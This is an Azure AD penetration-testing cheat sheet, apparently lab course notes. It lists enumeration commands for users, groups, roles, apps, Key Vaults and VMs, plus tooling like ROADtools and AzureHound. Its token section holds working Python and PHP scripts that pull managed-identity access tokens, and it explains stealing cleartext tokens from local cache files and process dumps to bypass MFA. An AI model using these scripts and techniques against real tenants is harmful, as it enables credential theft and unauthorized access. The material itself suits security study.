# Authenticated enumeration

* [Enumerating through Azure Portal](#Enumeration-through-Azure-portal)
* [Enumeration using AzureAD Module](#Enumeration-using-AzureAD-Module)
  * [User enumeration](#User-enumeration)
  * [Group enumeration](#Group-enumeration)
  * [Role enumeration](#Role-enumeration)
  * [Devices enumeration](#Devices-enumeration)
  * [Administrative-unit Enumeration](#Administrative-unit-enumeration)
  * [App enumeration](#App-enumeration)
  * [Service-principals enumeration](#Service-principals-enumeration)
* [Enumeration using Az powershell](#Enumeration-using-Az-powershell)
  * [Available resources](#Available-resources)
  * [Roles](#Roles)
  * [Users](#Users)
  * [Groups](#Groups)
  * [Resources](#Resources)
* [Enumeration using Azure CLI](#Enumeration-using-Azure-CLI)
* [Using Azure tokens](#Using-Azure-tokens)
  * [Stealing tokens](#Stealing-tokens)
  * [Using tokes with CLI Tools - AZ PowerShell](#Using-tokes-with-CLI-Tools---AZ-PowerShell)
  * [Using tokes with CLI Tools - Azure CLI](#Using-tokes-with-CLI-Tools---Azure-CLI)
  * [Using tokes with AzureAD module](#Using-tokes-with-AzureAD-module)
  * [Using tokens with API's - management](#Using-tokens-with-API's---management)
  * [Abusing tokens](#Abusing-tokens)
* [Tools](#Tools)
  * [Roadtools](#Roadtools)
  * [Stormspotter](#Stormspotter)
  * [Bloodhound / Azurehound](#Bloodhound-/-Azurehound)

## General

* The three main tools used to enumerate
  * AzureAD Module. Syntax used is ```*AzureAD*```
    * **Used to manage Azure AD.**
    * Only to interact with Azure AD, no access to Azure resources.
  * Azure Powershell. Syntax used is ```*Az*``` and ```*AzAd*```
    * **Used to manage Azure resources.**
  * Azure CLI. Syntax used is ```*az*``` (Az space)
    * **Create and manage Azure Resources.**

### Enumeration through Azure portal

#### Login azure portal

Login to the azure portal with successfull attacks <https://portal.azure.com/>

#### Enumerate users, groups, devices, directory roles, enterprise applications

* Open the left menu --> Azure Active directory and click check the users, groups, Roles and administrators, Enterprise Application and devices tab.

* Also worth checking the "App services" and "Virtual machines"

## Enumeration using AzureAD Module

* <https://www.powershellgallery.com/packages/AzureAD>

* Rename .nukpkg to .zip and extract it

```powershell
Import-Module AzureAD.psd1
```

### Todo - Enumeration using AzureAD Module

#### Connect to Azure AD

```powershell
$creds = Get-Credential
Connect-AzureAD -Credential $creds
```

```powershell
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
Connect-AzureAD -Credential $creds
```

#### Get the current session state

```powershell
Get-AzureADCurrentSessionInfo
```

#### Get the details of the current tenant

```powershell
Get-AzureADTenantDetail
```

### User enumeration

#### Enumerate all users

```powershell
Get-AzureADUser -All $true
Get-AzureADUser -all $true | Select-Object UserPrincipalName, Usertype
```

#### Enumerate a specific user

```powershell
Get-AzureADUser -ObjectId <ID>
```

#### Search for a user based on string in first characters of displayname (Wildcard not supported)

```powershell
Get-AzureADUser -SearchString "admin"
```

#### Search for user who contain the word "admin" in their displayname

```powershell
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"}
```

#### List all the attributes for a user

```powershell
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | fl * 

Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | %{$_.PSObject.Properties.Name} 
```

#### Search attributes for all users that contain the string "password"

```powershell
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
```

#### All users who are synced from on-prem

```powershell
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null} 
```

#### All users who are from Azure AD

```powershell
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
```

#### Get objects created by any user (use -objectid for a specific user)

```powershell
Get-AzureADUser | Get-AzureADUserCreatedObject
```

#### Objects owned by a specific user

```powershell
Get-AzureADUserOwnedObject -ObjectId <ID>
```

### Group enumeration

#### List all groups

```powershell
Get-AzureADGroup -All $true
```

#### Enumerate a specific group

```powershell
Get-AzureADGroup -ObjectId <ID>
```

#### Search for a group based on string in first characters of DisplayName (wildcard not supported)

```powershell
Get-AzureADGroup -SearchString "admin" | fl * 
```

#### To search for a group which contains the word "admin" in their name

```powershell
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"}
```

#### Get groups that allow Dynamic membership (note the cmdlet name)

```powershell
Import-module AzureADPreview.psd1
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}  | fl *
```

#### All groups that are synced from on-prem (note that security groups are not synced)

```powershell
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
```

#### All groups that are from Azure AD

```powershell
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
```

#### Get members of a group

```powershell
Get-AzureADGroupMember -ObjectId <ID>
```

#### Get groups and roles where the specified user is a member

```powershell
Get-AzureADUser -SearchString 'test' | Get-AzureADUserMembership
Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
```

#### Usefull group + member script

```powershell
$roleUsers = @() 
$roles=Get-AzureADMSGroup
 
ForEach($role in $roles) {
  $users=Get-AzureADGroupMember -ObjectId $role.Id
  ForEach($user in $users) {
    write-host $role.DisplayName, $user.DisplayName, $user.UserPrincipalName, $user.UserType
    $obj = New-Object PSCustomObject
    $obj | Add-Member -type NoteProperty -name GroupName -value ""
    $obj | Add-Member -type NoteProperty -name UserDisplayName -value ""
    $obj | Add-Member -type NoteProperty -name UserEmailID -value ""
    $obj | Add-Member -type NoteProperty -name UserAccess -value ""
    $obj.GroupName=$role.DisplayName
    $obj.UserDisplayName=$user.DisplayName
    $obj.UserEmailID=$user.UserPrincipalName
    $obj.UserAccess=$user.UserType
    $roleUsers+=$obj
  }
}
$roleUsers
```

### Role enumeration

#### Get all available role templates

```powershell
Get-AzureADDirectoryroleTemplate
```

#### Get all roles

```powershell
Get-AzureADDirectoryRole
```

### Enumerate users to whom roles are assigned (Example of the Global Administrator role)

```powershell
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

#### List custom roles

```powershell
Import-Module .\AzureADPreview.psd1
$creds = Get-Credential
Connect-AzureAD -Credential $creds

Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

### Devices enumeration

#### Get all Azure joined and registered devices

```powershell
Get-AzureADDevice -All $true | fl *
```

#### Get the device configuration object (Note to the registrationquota in the output)

```powershell
Get-AzureADDeviceConfiguration | fl *
```

#### List Registered owners of all the devices

```powershell
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
```

#### List Registered user of all the devices

```powershell
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
```

#### List devices owned by a user

```powershell
Get-AzureADUserOwnedDevice -ObjectId <ID>
```

#### List deviced registered by a user

```powershell
Get-AzureADUserRegisteredDevice -ObjectId <ID>
```

#### List deviced managed using Intune

```powershell
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"} 
```

### Administrative-unit enumeration

#### List the administrative units

```powershell
Get-AzureADMSAdministrativeUnit
```

#### Get members of the administrative unit

```powershell
Get-AzureADMSAdministrativeUnitMember -id <ID>
```

#### Get roles scoped in the administrative unit

```powershell
Get-AzureADMSScopedRoleMembership -id <ID> | fl *
```

#### Check the role using the roleid

```powershell
Get-AzureADDirectoryRole -ObjectId <ID>
```

### App enumeration

#### Get all application objects registered using the current tenant

```powershell
Get-AzureADApplication -All $true
```

#### Get all details about an application

```powershell
Get-AzureADApplication -ObjectId <ID> | fl *
```

#### Get an application based on the display name

```powershell
Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"}
```

#### Show application with a application password (Will not show passwords)

```powershell
Get-AzureADApplicationPasswordCredential 
```

#### Get the owner of a application

```powershell
Get-AzureADApplication -ObjectId <ID> | Get-AzureADApplicationOwner | fl *
```

#### Get apps where a user has a role (exact role is not shown)

```powershell
Get-AzureADUser -ObjectId <ID> | Get-AzureADUserAppRoleAssignment | fl * 
```

#### Get apps where a group has a role (exact role is not shown)

```powershell
Get-AzureADGroup -ObjectId <ID> | Get-AzureADGroupAppRoleAssignment | fl *
```

### Service-principals enumeration

Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'! Service Principals can be assigned Azure roles.

#### Get all service principals

```powershell
Get-AzureADServicePrincipal -All $true
```

#### Get all details about a service principal

```powershell
Get-AzureADServicePrincipal -ObjectId <ID> | fl *
```

#### Get a service principal based on the display name

```powershell
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}
```

#### Get owners of a service principal

```powershell
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalOwner | fl *
```

#### Get objects owned by a service principal

```powershell
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalOwnedObject
```

#### Get objects created by a service principal

```powershell
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalCreatedObject
```

#### Get group and role memberships of a service principal

```powershell
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalMembership | fl * 

Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
```

## Enumeration using Az powershell

### Todo Enumeration with Az powershell

#### Install module

```powershell
Install-Module Az
```

#### List all az commands

```powershell
Get-Command -Module Az.*
```

#### List cmdlets for Az AD powershell (\*Azad format\*)

```powershell
Get-Command *aZad*
```

#### List all cmdlets for Azure resources (\*Az format\*)

```powershell
Get-Command *aZ*
```

#### List all cmdlets for a particular resource

```powershell
Get-Command *azvm*
Get-Command -Noun *vm* -Verb Get
Get-Command *vm*
```

#### Login with the az module

```powershell
Connect-AzAccount
```

#### Get the information about the current context (Account, Tenant, Subscription etc)

```powershell
Get-AzContext
```

#### List available contexts

```powershell
Get-AzContext -ListAvailable
```

#### Change AZ context

```powershell
Set-AzContext <ID>
```

### Available resources

#### Enumerate subscriptions accessible by the current user

```powershell
Get-AzSubscription
```

#### Enumerate all resources visible to the current user

* Error 'this.Client.SubscriptionId' cannot be null' means the managed identity has no rights on any of the Azure resources.

```powershell
Get-AzResource
Get-AzResource | select-object Name, Resourcetype
```

### Roles

#### Enumerate all Azure RBAC role assignments

```powershell
Get-AzRoleAssignment
```

#### Check role assignments on ResourceID

```powershell
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

#### Get the allowed actions on the role definition

```powershell
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

### Users

#### AZ Enumerate all users

```powershell
Get-AzADUser
```

#### AZ Enumerate a specific user

```powershell
Get-AzADUser -UserPrincipalName <NAME>
```

#### Search for a user based on string in first character of displayname (Wildcard not supported)

```powershell
Get-AzADUser -SearchString "admin" 
```

#### Search for a user who contain the word "admin" in their displayname

```powershell
Get-AzADUser |?{$_.Displayname -match "admin"}
```

### Groups

#### AZ List all groups

```powershell
Get-AzADGroup
```

#### AZ Enumerate a specific group

```powershell
Get-AzADGroup -ObjectId <ID>
```

#### Search for a group based on string in first characters of displayname (wildcard not supported)

```powershell
Get-AzADGroup -SearchString "admin" | fl * 
```

#### To search for groups which contain the word "admin" in their name

```powershell
Get-AzADGroup |?{$_.Displayname -match "admin"}
```

#### AZ Get members of a group

```powershell
Get-AzADGroupMember -ObjectId <ID>
```

### Resources

#### Get all the application objects registered with the current tenant (visible in App  Registrations in Azure portal). An application object is the global representation of an app

```powershell
Get-AzADApplication
```

#### AZ Get all details about an application

```powershell
Get-AzADApplication -ObjectId <ID>
```

#### AZ Get an application based on the display name

```powershell
Get-AzADApplication | ?{$_.DisplayName -match "app"}
```

#### AZ Get all service principals

```powershell
Get-AzADServicePrincipal
```

#### AZ Get all details about a service principal

```powershell
Get-AzADServicePrincipal -ObjectId <ID>
```

#### AZ Get an service principal based on the display name

```powershell
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"} 
```

#### List all VM's the user has access to

```powershell
Get-AzVM 
Get-AzVM | fl
```

#### Get all function apps

```powershell
Get-AzFunctionApp
```

#### Get all webapps

```powershell
Get-AzWebApp
Get-AzWebApp | select-object Name, Type, Hostnames
```

#### List all storage accounts

```powershell
Get-AzStorageAccount
Get-AzStorageAccount | fl
```

#### List all keyvaults

```powershell
Get-AzKeyVault
```

#### Get info about a specific keyvault

```powershell
Get-AzKeyVault -VaultName ResearchKeyVault
```

#### List the saved creds from keyvault

```powershell
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -AsPlainText
```

#### Read creds from a keyvault

```powershell
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

## Enumeration using Azure CLI

* Install <https://docs.microsoft.com/en-us/cli/azure/install-azure-cli>

* Accessible in the cloud shell to

### Todo Enumeration with Azure CLI

#### Login

```powershell
az login

az login -u <USERNAME> -p <PASSWORD>
```

#### List info on the current user

```powershell
az ad signed-in-user show
```

#### Configure default behavior (Output type, location, resource group etc)

```powershell
az configure
```

#### Find popular commands

```powershell
az find "vm"

az find "az vm"

az find "az vm list" 
```

#### List all users

Use the --output parameter to change the output layout, default is json

```powershell
az ad user list --output table
```

#### List only the userPrincipalName and givenName

Second command renames properties

```powershell
az ad user list --query "[].[userPrincipalName,displayName]" --output table

az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table
```

#### We can use JMESPath query on the results of JSON output. Add --query-examples at the end of any command to see examples

```powershell
az ad user show list --query-examples 
```

#### Get details of the current tenant

```powershell
az account tenant list
```

#### Get details of the current subscription

```powershell
az account subscription list
```

#### List the current signed-in user

```powershell
az ad signed-in-user show
```

#### List all owned objects by user

```powershell
az ad signed-in-user list-owned-objects
```

#### AZ-CLI Enumerate all users

```powershell
az ad user list
az ad user list --query "[].[displayName]" -o table
```

#### AZ-CLI Enumerate a specific user

```powershell
az ad user show --id test@defcorphq.onmicrosoft.com
```

#### Search for users who contain the word "admin" in their Display name (case sensitive)

```powershell
az ad user list --query "[?contains(displayName,'admin')].displayName"
```

#### When using PowerShell, search for users who contain the word "admin" in their Display name. This is NOT case-sensitive

```powershell
az ad user list | ConvertFrom-Json | %{$_.displayName -match "admin"}
```

#### List all users who are synced from on-prem

```powershell
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
```

#### AZ-CLI All users who are from Azure AD

```powershell
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
```

#### AZ-CLI List all groups

```powershell
az ad group list 
az ad group list --query "[].[displayName]" -o table
```

#### Enumerate a specific group using display name or object id

```powershell
az ad group show -g "VM Admins" 
az ad group show -g <ID>
```

#### Search for groups that contain the word "admin" in their Display name (case sensitive) - run from cmd

```powershell
az ad group list --query "[?contains(displayName,'admin')].displayName"
```

#### When using PowerShell, search for groups that contain the word "admin" in their Display name. This is NOT case-sensitive

```powershell
az ad group list | ConvertFrom-Json | %{$_.displayName -match "admin"}
```

#### All groups that are synced from on-prem

```powershell
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
```

#### AZ-CLI All groups that are from Azure AD

```powershell
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
```

#### AZ-CLI Get members of a group

```powershell
az ad group member list -g "VM Admins" --query "[].[displayName]" -o table 
```

#### Check if user is member of the specified group

```powershell
az ad group member check --group "VM Admins" --member-id <ID>
```

#### Get the object IDs of the groups of which the specified group is a member

```powershell
az ad group get-member-groups -g "VM Admins"
```

#### Get all the application objects registered with the current tenant

```powershell
az ad app list
az ad app list --query "[].[displayName]" -o table
```

#### Get all details about an application using identifier uri, application id or object id

```powershell
az ad app show --id <ID>
```

#### Get an application based on the display name (Run from cmd)

```powershell
az ad app list --query "[?contains(displayName,'app')].displayName"
```

#### When using PowerShell, search for apps that contain the word "slack" in their Display name. This is NOT case-sensitive

```powershell
az ad app list | ConvertFrom-Json | %{$_.displayName -match "app"}
```

#### Get owner of an application

```powershell
az ad app owner list --id <ID> --query "[].[displayName]" -o table
```

#### List apps that have password credentials

```powershell
az ad app list --query "[?passwordCredentials != null].displayName" 
```

#### List apps that have key credentials

```powershell
az ad app list --query "[?keyCredentials != null].displayName" 
```

#### Get all service principal names

```powershell
az ad sp list --all
az ad sp list -all --query "[].[displayName]" -o table
```

#### AZ-CLI Get all details about a service principal

```powershell
az ad sp show --id <ID>
```

#### AZ-CLI Get a service principal based on the display name

```powershell
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
```

#### When using PowerShell, search for service principals that contain the word "slack" in their Display name. This is NOT case-sensitive

```powershell
az ad sp list --all | ConvertFrom-Json | %{$_.displayName -match "app"}
```

#### Get owner of a service principal

```powershell
az ad sp owner list --id <ID> --query "[].[displayName]" -o table
```

#### Get service principal owned by the current user

```powershell
az ad sp list --show-mine
```

#### AZ-CLI List apps that have password credentials

```powershell
az ad sp list --all --query "[?passwordCredentials != null].displayName"
```

#### AZ-CLI List apps that have key credentials

```powershell
az ad sp list -all --query "[?keyCredentials != null].displayName"
```

#### List all the vm's

```powershell
az vm list
az vm list --query "[].[name]" -o table
```

#### List all app services

```powershell
az webapp list
az webapp list --query "[].[name]" -o table
```

#### List function apps

```powershell
az functionapp list
az functionapp list --query "[].[name]" -o table
```

#### list the readable keyvaults

```powershell
az keyvault list
```

#### List storage accounts

```powershell
az storage account list
```

## Using Azure tokens

* Both Az PowerShell and AzureAD modules allow the use of Access tokens for authentication.

* Usually, tokens contain all the claims (including that for MFA and Conditional Access etc.) so they are useful in bypassing such security controls.
* Office 365 stealer steals a token for the Graph API with the permissions that are registered.
* For managed identities check the IDENTITY_ENDPOINT to see which token it is.
* Can also use <https://jwt.io> or <https://jwt.ms> to see what token it is.
* Which token to use
  * Access Token - Azure Resouces
  * Graph Token - Azure AD
  * Key Vault Token - Keyvault Access

### Stealing tokens

#### Stealing tokens from az cli

* az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```

* We can read tokens from the file, use them and request new ones too!
* `azureProfile.json` in the same directory contains information about subscriptions.
* You can modify `accessTokens.json` to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
* To clear the access tokens, always use az logout

#### Stealing tokens from az powershell

* Az PowerShell stores access tokens in clear text in ```TokenCache.dat``` in the directory ```C:\Users\<username>\.Azure```

* It also stores ServicePrincipalSecret in clear-text in `AzureRmContext.json` if a service principal secret is used to authenticate.
* Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
* Users can save tokens using Save-AzContext, look out for them! Search for `Save-AzContext` in PowerShell console history!
* Always use Disconnect-AzAccount!!

#### Request tokens from the CLI

* Check below for example in using tokens!

### Stealing token scripts

#### Python

```powershell
import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()

print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\r\n[+] Graph API")
print(json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])
```

#### PHP

```powershell
<?php 

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

### Using tokes with CLI Tools - AZ PowerShell

#### Request access token

```powershell
Get-AzAccessToken
(Get-AzAccessToken).Token
```

#### Request an access token for AAD Graph to access Azure AD

* Supported tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse

```powershell
Get-AzAccessToken -ResourceTypeName AadGraph
```

#### Request token for microsoft graph

```powershell
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token
```

#### Use the access token

```powershell
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA...
```

#### Use other access token

* In the below command, use the one for AAD Graph (access token is still required) for accessing Azure AD

* To access something like keyvault you need to get the access token for it before you can access it.

```powershell
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... -GraphAccessToken eyJ0eXA...
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... 
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... -Tenantid <Tenant ID>
```

### Using tokes with CLI Tools - Azure CLI

Azure CLI can request a token but cannot use it!

#### Request an access token (ARM)

```powershell
az account get-access-token
```

#### Request an access token

Supported tokens - aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms

```powershell
az account get-access-token --resource-type ms-graph 
```

### Using tokes with AzureAD module

* AzureAD module cannot request a token but can use one for AADGraph or Microsoft Graph!

* To be able to interact with Azure AD, request a token for the aad-graph.

#### Connecting with AzureAD

```powershell
Connect-AzureAD -AccountId <ID> -AadAccessToken $token -TenantId <TENANT ID>
```

### Using tokens with API's - management

* The two REST APIs endpoints that are most widely used are
  – Azure Resource Manager - management.azure.com
  – Microsoft Graph - graph.microsoft.com (Azure AD Graph which is deprecated is graph.windows.net)

* Let's have a look at super simple PowerShell codes for using the APIs

#### Get an access token and use it with ARM API. For example, list all the subscriptions

```powershell
$Token = 'eyJ0eXAi..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

#### Get an access token for MS Graph. For example, list all the users

```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/users'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value 
```

### Abusing tokens

#### Check the resources available to the managed identity

Throws an error and nikil is unsure why

```powershell
$token = 'eyJ0eX...'

Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
```

#### Use the Azure REST API to get the subscription id

```powershell
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

#### List all the resources available by the managed identity to the app service

```powershell
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

#### Check what actions are allowed to the vm

* The runcommand privileges lets us execute commands on the VM

```powershell
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}

(Invoke-RestMethod @RequestParams).value
```

#### List all enterprise applications

```powershell
$Token = 'ey..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
  }
}
(Invoke-RestMethod @RequestParams).value
```

#### List all the groups, administrative units of a user

```powershell
$Token = 'eyJ0..' 
$URI =
'https://graph.microsoft.com/v1.0/users/VMContributorX@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

## Tools

### Roadtools

<https://github.com/dirkjanm/ROADtools>

* Enumeration using RoadRecon includes three steps
  – Authentication
  – Data Gathering
  – Data Exploration
  
#### roadrecon supports username/password, access and refresh tokens, device code flow (sign-in from another device) and PRT cookie

```powershell
cd C:\AzAD\Tools\ROADTools
pipenv shell 
roadrecon auth -u <USERNAME> -p <PASSWORD>
```

#### Gather information

```powershell
roadrecon gather
```

#### Start roadrecon gui

```powershell
roadrecon gui
```

### Stormspotter

<https://github.com/Azure/Stormspotter>

#### Start the backend service

```powershell
cd C:\AzAD\Tools\stormspotter\backend\
pipenv shell
python ssbackend.pyz
```

#### Start the frontend server

```powershell
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\
quasar.cmd serve -p 9091 --history
```

#### Collect data

```powershell
cd C:\AzAD\Tools\stormspotter\stormcollector\
pipenv shell
az login -u <USERNAME> -p <PASSWORD>
python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli 
```

#### Check data

* Log-on to the webserver at <http://localhost:9091>. creds = neo4j:BloodHound

* After login, upload the ZIP archive created by the collector.
* Use the built-in queries to visualize the data.

### Bloodhound / Azurehound

* <https://github.com/BloodHoundAD/AzureHound>

* More queries: <https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/>

#### Run the collector to collect data

```powershell
import-module .\AzureAD.psd1

$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd) 
Connect-AzAccount -Credential $creds
Connect-AzureAD -Credential $creds


. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

#### Change object ID's to names in Bloodhound

```powershell
MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname
```

#### Find all users who have the Global Administrator role

```powershell
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
```

#### Find all paths to an Azure VM

```powershell
MATCH p = (n)-[r]->(g: AZVM) RETURN p
```

#### Find all paths to an Azure KeyVault

```powershell
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
```

#### Find all paths to an Azure Resource Group

```powershell
MATCH p = (n)-[r]->(g:AZResourceGroup) RETURN p
```

#### Find Owners of Azure Groups

```powershell
MATCH p = (n)-[r:AZOwns]->(g:AZGroup) RETURN p
```
